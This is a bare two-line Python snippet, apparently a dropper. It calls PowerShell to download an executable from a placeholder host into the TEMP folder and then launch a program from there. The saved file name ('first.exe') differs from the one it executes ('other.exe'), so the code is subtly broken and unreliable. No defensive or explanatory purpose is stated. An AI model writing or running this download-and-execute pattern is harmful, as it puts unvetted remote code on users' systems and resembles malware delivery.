import subprocess
subprocess.run(["powershell", "-Command", "curl.exe -L https://example.invalid/client.exe -o $env:TEMP\\first.exe; Start-Process $env:TEMP\\other.exe"])
